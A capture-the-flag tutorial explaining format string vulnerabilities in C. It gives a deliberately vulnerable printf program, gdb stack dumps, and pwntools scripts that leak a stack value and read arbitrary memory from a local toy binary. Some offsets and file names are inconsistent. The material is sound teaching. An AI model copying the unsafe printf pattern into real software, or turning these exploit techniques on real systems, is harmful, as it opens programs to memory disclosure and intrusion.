---
slug: '/capture-the-flag/format-string-vulnerability'
date: '2022-12-16'
title: 'Format String Vulnerability'
---

# Format String Vulnerability

## Author : Frankie Huang (IF 2021)

## Prerequisite

- GNU C Compiler (gcc)
- UNIX like operating system to run the ELF file
- pwntools

## What is a string format?

In C, we can input and output a variable value using a format specifiers by passing a certain format into `printf`, `scanf`, etc. Some commonly used formats are as follow.

| Format | Size   | Output         |
| ------ | ------ | -------------- |
| `%c`   | 1 byte | character      |
| `%d`   | 4 byte | signed integer |
| `%x`   | 4 byte | hexadecimal    |
| `%ll`  | 8 byte | long long int  |
| `%llx` | 8 byte | long long hex  |
| `%s`   |        | string         |

## How does format string vulnerability work?

Recall that in a 32-bit UNIX, we pass the arguments of a function by pushing the value in the stack followed by the function return address. Similarly, when calling the function `printf`, we are pushing n amount of values into the stack, where n are the amount of format specifiers.

Let's observe the following program.

```c
#include <stdio.h>
#include <unistd.h>

int main()
{
    int secret_num = 0xdeadbeef;

    char name[16];
    scanf("%16s", &name);

    printf("Hello ");
    printf(name);
    printf("! You'll never get my secret!\n");
}
```

We can save the program above as `secret.c` and compile it as below.

```bash
> gcc secret.c -o secret -m32 -no-pie
```

We can then open `gdb` to debug this program. To view the current stack, use `x/40x $sp` to print the 40 top value of the stack.

Let's observe the important part of the stack right after the function `scanf` with input `Steven` is run.

```
                     .....
            0xffffd8f0 : 0xff006e65
            0xffffd8ec : 0x76657453
            0xffffd8e8 : 0xdeadbeef
            0xffffd8e4 : 0x00000000
            0xffffd8e0 : 0x00000000
            0xffffd8dc : 0x565561b4
            0xffffd8d8 : 0x00000000
            0xffffd8d4 : 0xffffd8ec
     esp -> 0xffffd8d0 : 0x56557008
```

Due to how GCC decided to lay out the stack, `secret_num` is actually at a lower address on the stack than `name`. We can see this in the stack above, where the address `0xffffd8e8` has the value of `0xdeadbeef` while the address `0xffffd8ec` to `0xffffd8f2` has the value of `0x53746576656e00` (remember that IA-32 and x86-64 CPU use the little-endian format). We can see that it holds the hex value for `Steven`.

So, what string format can we input to print the value of `secret_num`? We can input the format argument `%x.%x.%x.%x` to pop off four stack values and print them in hexadecimal. Another way to do it involves around the idea that `printf` can index to an arbitrary "argument" with the syntax `%n$llx` (where `n` is the decimal index of the argument).

In the example above, we can see that `secret_num` is located at the 7th position from the top of the stack. Recall that `%llx` takes 8 bytes of data, so we can use the command `%6$x` to print the 7th position from the top of the stack.

```bash
> ./secret
%6$x
Hello deadbeef! You'll never get my secret!
```

## Arbitrary Reads

In C, the `%s` format specifier act as a pointer to the start of the string. This is essentially a value that represents a memory address, which means when we are reading a value of the stack, we are reading _the value in the memory address_ it points at.

So, if we can find a value on the stack that happens to correspond to the memory address of the value we're looking for, then that's it. But we can also specify where we want to read using this same exploit!

Let's run the previous program again, but with a different input.

```bash
> ./secret
ABCD|%7$p
Hello ABCD|0x44434241! You'll never get my secret!
```

Recall that due to the way GCC decided to lay the stack, `name` is at a higher address than `secret_num`, which in this case, it's at the 8th position from the top of the stack. We can see that the program outputs the hexadecimal representation of `ABCD`.

Now, if we can write an address, then point `%s` at `%7$p`, then we can get an arbitrary read!

Now, let's write a quick pwntools script that write the location of the ELF file and reads it with `%s`. If all goes well, we should be able to read the first bytes of the file, which is always `\x7ELF`. Starting from the basic:

```py
from pwn import *

p = process('./secret')

payload = p32(0x41424344)
payload += b"%7$p"

p.sendline(payload)
log.info(p.clean())
```

```bash
> python3 exploit.py
[+] Starting local process './secret': pid 22336
[*] Hello DCBA0x41424344! You'll never get my secret!
```

Now that we know that it works, because all binary files have the base address of `0x8048000`, we can pass the value into the payload.

```py
from pwn import *

p = process('./secret')

payload = p32(0x8048000)
payload += b"|%7$p"

p.sendline(payload)
log.info(p.clean())
```

```bash
> python3 exploit.py
[+] Starting local process './secret': pid 22336
[*] Hello ! You'll never get my secret!
```

It doesn't work.

The reason it doesn't work is that `printf` will stop at null bytes, and the very first character of `0x8048000` is a null byte. To get around this, we have to put the format specifier first.

```py
from pwn import *

p = process('./test')

payload = b"%9$p||||"
payload += p32(0x8048000)

p.sendline(payload)
log.info(p.clean())
```

```bash
[+] Starting local process './test': pid 27109
[*] Hello 0x8048000||||! You'll never get my secret!
```

Now, let's break down the payload we used:

- The payload starts from the address `%7$p`
- When we move the format specifiers to the front, the 8th to 10th value of the stack are as follows:
  - The value of `%7$p` is the hex value of `%9$p`
  - The value of `%8$p` is the hex value of `||||`
  - The value of `%9$p` is the hex value of `0x8048000`

Another payload we can use in this scenario are `%8$p + b"0x8048000"`.

Now, we can change `%9$p` to `%9$s` to pass the address and read it with `%s`.

```py
from pwn import *

p = process('./test')

payload = b"%9$s||||"
payload += p32(0x8048000)

p.sendline(payload)
log.info(p.clean())
```

```bash
[+] Starting local process './test': pid 27254
[*] Hello \x7fELF||||! You'll never get my secret!
```
